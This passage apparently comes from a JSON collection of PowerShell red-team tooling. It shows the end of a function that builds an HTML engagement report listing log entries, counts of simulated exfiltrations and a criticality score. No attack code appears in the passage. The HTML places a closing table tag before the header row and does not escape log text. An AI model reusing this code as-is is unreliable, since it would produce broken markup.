style='background:$color'><td>$($_.TS)</td><td>$($_.Level)</td><td>$($_.Msg)</td></tr>\"\n    }\n    $html = @\"\n<!DOCTYPE html><html><head><meta charset='utf-8'><title>$EngagementName</title>\n<style>body{font-family:monospace;background:#1a1a2e;color:#eee}h1{color:#e94560}table{width:100%;border-collapse:collapse}td{padding:4px 8px;font-size:.85em}th{background:#16213e;padding:6px}</style>\n</head><body>\n<h1>$EngagementName</h1>\n<h2>Généré le $(Get-Date)</h2>\n<p><b>Actions:</b> $actions | <b>Warnings:</b> $warns | <b>Errors:</b> $errors | <b>Exfils simulées:</b> $exfils | <b>Score criticité:</b> $score/100</p>\n</table><tr><th>Timestamp</th><th>Level</th><th>Message</th></tr>\n$($rows -join \"`n\")\n</table></body></html>\n\"@\n    $html | Out-File $OutputPath -Encoding UTF8\n    Write-RTLog \"REPORT_GENERATED: $OutputPath | Score=$score/100\" -Level 'ACTION'\n    return $OutputPath\n}",
+   "tags": [
+    "reporting",
+    "HTML",
+    "timeline",
+    "MITRE",
+    "scoring"
+   ]
+  }
+ ]
+}
